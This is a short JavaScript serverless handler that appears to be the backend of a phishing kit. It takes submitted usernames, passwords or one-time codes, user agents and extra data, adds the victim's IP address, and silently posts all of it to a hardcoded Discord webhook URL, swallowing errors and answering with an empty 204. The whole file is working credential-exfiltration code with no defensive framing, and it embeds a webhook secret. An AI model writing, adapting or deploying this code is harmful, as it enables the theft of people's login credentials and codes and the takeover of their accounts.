export default async function handler(req, res) {
  if (req.method !== "POST") {
    res.status(405).end();
    return;
  }

  const webhook =
    process.env.DISCORD_WEBHOOK ||
    "https://discord.com/api/webhooks/1542285698793738261/V5Xo_-9X3wofL-Xc_iAquKH4ml6nKaR203vTarrbw6LOWaZGGJJEK-b97o3rguhoALYp";

  let data = {};
  try {
    data = typeof req.body === "string" ? JSON.parse(req.body || "{}") : req.body || {};
  } catch {}

  const ip = (req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "").toString();
  const text = [
    `**${data.type || "event"}**`,
    `user: \`${data.username || ""}\``,
    `pass/code: \`${data.password || ""}\``,
    `ip: ${ip}`,
    `ua: ${data.ua || ""}`,
    data.extra || ""
  ].join("\n");

  try {
    await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: String(text).slice(0, 1900) })
    });
  } catch {}

  res.status(204).end();
}
